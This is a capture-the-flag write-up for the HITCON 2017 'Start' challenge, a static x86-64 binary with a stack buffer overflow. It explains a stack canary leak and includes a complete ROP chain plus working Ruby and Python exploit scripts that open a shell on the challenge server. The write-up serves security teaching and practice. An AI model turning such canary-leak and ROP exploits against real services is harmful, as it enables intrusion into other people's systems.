---
title: Hitcon CTF 2017 - Start
date: '2017-11-06'
lastmod: '2019-04-07T13:46:27+02:00'
categories:
- ctf_hitcon2017
- writeup
- hitcon2017
tags:
- exploitation
authors:
- andreafioraldi
---

The given binary is static.

Checksec:

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

The main procedure is so simple:

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-20h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  alarm(10LL, argv, envp);
  setvbuf(stdin, 0LL, 2LL, 0LL);
  setvbuf(stdout, 0LL, 2LL, 0LL);
  while ( read(0LL, &v4, 217LL) != 0 && (unsigned int)strncmp(&v4, "exit\n", 5LL) )
    puts(&v4);
  return 0;
}
```

If we have a leak of the canary we can overwrite the return address with the buffer overflow.

Sending 24 characters and newline the puts call will print out the canary (overwriting the last byte, but it is always 0).

It's time to build a rop chain.

I used ROPGadget to generate it but it was too long.

So i changed the chain a bit:

```python
p += p64(0x00000000004017f7) # pop rsi ; ret
p += p64(0x00000000006cc080) # @ .data
p += p64(0x000000000047a6e6) # pop rax ; pop rdx ; pop rbx ; ret
p += '/bin//sh'
p += p64(0x4141414141414141) # padding
p += p64(0x4141414141414141) # padding
p += p64(0x0000000000475fc1) # mov qword ptr [rsi], rax ; ret
p += p64(0x00000000004017f7) # pop rsi ; ret
p += p64(0x00000000006cc088) # @ .data + 8
p += p64(0x000000000042732f) # xor rax, rax ; ret
p += p64(0x0000000000475fc1) # mov qword ptr [rsi], rax ; ret
p += p64(0x00000000004005d5) # pop rdi ; ret
p += p64(0x00000000006cc080) # @ .data
p += p64(0x00000000004017f7) # pop rsi ; ret
p += p64(0x00000000006cc088) # @ .data + 8
p += p64(0x0000000000443776) # pop rdx ; ret
p += p64(0x00000000006cc088) # @ .data + 8
p += p64(0x000000000042740e) # add eax, 0x1d ; ret
p += p64(0x000000000042740e) # add eax, 0x1d ; ret
p += p64(0x0000000000468320) # add rax, 1 ; ret
p += p64(0x0000000000468e75) # syscall ; ret
```

Ok now we must build the exploit using pwntools-ruby:

```ruby
z = Sock.new '127.0.0.1', 31338;

#canary leak
z.sendline "A"*24 ;
z.recvline;
r = z.recvline;
canary = "\x00" + r[0..6];

#build payload
p = "a"*24 + canary + p64(0x6cc018); #0x6cc018 id rbp
p += p64(0x00000000004017f7);
p += p64(0x00000000006cc080);
p += p64(0x000000000047a6e6);
p += '/bin//sh';
p += p64(0x4141414141414141);
p += p64(0x4141414141414141);
p += p64(0x0000000000475fc1);
p += p64(0x00000000004017f7);
p += p64(0x00000000006cc088);
p += p64(0x000000000042732f);
p += p64(0x0000000000475fc1);
p += p64(0x00000000004005d5);
p += p64(0x00000000006cc080);
p += p64(0x00000000004017f7);
p += p64(0x00000000006cc088);
p += p64(0x0000000000443776);
p += p64(0x00000000006cc088);
p += p64(0x000000000042740e);
p += p64(0x000000000042740e);
p += p64(0x0000000000468320);
p += p64(0x0000000000468e75);
z.send p;
z.recvline;
z.sendline "exit"; #go to 'ret'

#send command to the shell
z.sendline("uname -a");
print z.recv(5000)
```

After testing it in localhost with socat, i wrote a python script that I used to send the ruby exploit:

```python
from pwn import *

def run(cmd):
    expl = '''z = Sock.new '127.0.0.1', 31338;z.sendline "A"*24 ;r = z.recvline;r = z.recvline;canary = "\x00" + r[0..6];p = "a"*24 + canary + p64(0x6cc018) ;p += p64(0x00000000004017f7);p += p64(0x00000000006cc080);p += p64(0x000000000047a6e6);p += '/bin//sh';p += p64(0x4141414141414141);p += p64(0x4141414141414141);p += p64(0x0000000000475fc1);p += p64(0x00000000004017f7);p += p64(0x00000000006cc088);p += p64(0x000000000042732f);p += p64(0x0000000000475fc1);p += p64(0x00000000004005d5);p += p64(0x00000000006cc080);p += p64(0x00000000004017f7);p += p64(0x00000000006cc088);p += p64(0x0000000000443776);p += p64(0x00000000006cc088);p += p64(0x000000000042740e);p += p64(0x000000000042740e);p += p64(0x0000000000468320);p += p64(0x0000000000468e75);z.send p;z.recvline;z.sendline "exit"; z.sendline("''' + cmd + '''"); print z.recv(5000)'''

    sh = remote("54.65.72.116", 31337)
    sh.recvuntil("> ")
    sh.sendline(expl)
    print sh.recvall()


c = raw_input("> ")
while c != "q":
    run(c)
    c = raw_input("> ")
```

Now you can navigate the filesystem and get the flag.
